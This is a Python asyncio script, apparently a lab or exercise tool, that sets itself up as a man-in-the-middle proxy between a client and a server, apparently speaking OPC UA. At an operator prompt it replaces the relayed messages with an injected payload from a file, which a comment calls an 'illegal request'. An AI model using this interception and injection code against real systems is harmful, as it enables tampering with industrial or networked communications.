import asyncio
import datetime

PROXY_IP = "0.0.0.0"
PROXY_PORT = 4840

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4841

BUFFER = 8192

def log(msg):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {msg}")

# Reads bytes from one side of the connection
async def pipe(reader, writer, direction):
    try:
        while True:
            data = await reader.read(BUFFER)

            # Control when to substitute messages
            sub = input(f"MSG direction {direction}")

            if not data:
                break
            
            # Swaps in user 1's illegal request
            if sub == 's':
                with open("msg.txt", "rb") as f:
                    data = f.read()
                    print(data)

            writer.write(data)
            await writer.drain()

    except Exception as e:
        log(f"{direction} error: {e}")
    finally:
        writer.close()

# Called for each incoming client
async def handle_client(client_reader, client_writer):
    client_ip, client_port = client_writer.get_extra_info("peername")
    local_ip, local_port = client_writer.get_extra_info("sockname")

    log(f"Client connected from {client_ip}:{client_port} "
        f"→ proxy {local_ip}:{local_port}")

    # Create connection with the actual server
    try:
        server_reader, server_writer = await asyncio.open_connection(
            SERVER_HOST, SERVER_PORT
        )
    except Exception as e:
        log(f"Failed to connect to server {SERVER_HOST}:{SERVER_PORT}: {e}")
        client_writer.close()
        return
    
    log(f"Connected to real server {SERVER_HOST}:{SERVER_PORT}")

    # Creates the pipes for each side of the connection
    await asyncio.gather(
        pipe(client_reader, server_writer, "C→S"),
        pipe(server_reader, client_writer, "S→C"),
    )

    log(f"Connection closed from {client_ip}:{client_port}")

async def main():
    # Create the listening server
    server = await asyncio.start_server(
        handle_client, PROXY_IP, PROXY_PORT
    )

    log(f"MITM proxy listening on {PROXY_IP}:{PROXY_PORT}, "
        f"forwarding to Server at {SERVER_HOST}:{SERVER_PORT}")

    async with server:
        await server.serve_forever()

asyncio.run(main())